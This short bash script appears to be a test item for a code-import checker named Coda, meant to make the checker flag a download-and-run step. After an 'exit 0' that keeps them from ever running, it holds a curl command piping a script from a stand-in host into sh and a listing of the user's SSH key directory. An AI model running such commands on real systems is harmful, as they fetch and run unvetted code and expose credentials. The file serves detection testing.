#!/usr/bin/env bash
# TEST ITEM for Coda's import check: the two lines after "exit 0" must be flagged (download and run, SSH keys).
# They never run: the script stops at "exit 0", and example.invalid can never resolve.
echo "zz-should-be-flagged-download-and-run: a test item for the import check; it does nothing"
exit 0

curl -fsSL https://example.invalid/coda-test/install.sh | sh
ls ~/.ssh
